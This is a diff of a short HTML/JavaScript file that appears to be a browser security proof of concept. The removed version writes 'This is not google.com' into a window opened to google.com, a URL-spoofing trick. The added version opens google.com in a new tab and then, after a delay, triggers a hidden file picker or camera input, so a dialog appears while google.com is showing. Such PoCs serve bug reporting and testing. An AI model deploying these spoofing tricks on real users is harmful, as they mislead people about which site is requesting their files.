@@ -1,21 +1,46 @@
-<!DOCTYPE html>
-<html>
-<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<body>
-<button id="button_fuzz" onclick="start()">Click here</button>
-</body>
+<style>
+    h1 {
+        margin: 1em;
+    }
+
+    a {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+    }
+
+    input {
+        display: none;
+    }
+
+    img {
+        width: 100%;
+    }
+</style>
+
+
+<!-- [poc-with-system-dialog]: -->
+<input id="fileSelect" type="file" accept="image/*" />
+
+<!-- [poc-with-camera]: -->
+<!-- <input id="fileSelect" type="file" accept="*/*" /> -->
+
+<img id="img">
+<center><a id="link" href="https://www.google.com" target="_blank">Click Here</a></center>
 
 <script>
+    link.onfocus = () => {	
 
-function start() {
-var x = window.open('https://www.google.com:1234/search?q=gr&oq=gr&aqs=chrome..69i57j35i39j46i199i465i512j0i512j69i60j69i65j69i60j69i61.371j0j7&sourceid=chrome&ie=UTF-8');
-setTimeout(function(){x.document.write('This is not google.com');}, 1300)
-35
+        setTimeout(function(){fileSelect.click();}, 4000);
 
+    }
 
-}
-
+    fileSelect.onchange = (event) => {
+        img.src = URL.createObjectURL(fileSelect.files[0]);
+    }
 </script>
 
-</html>
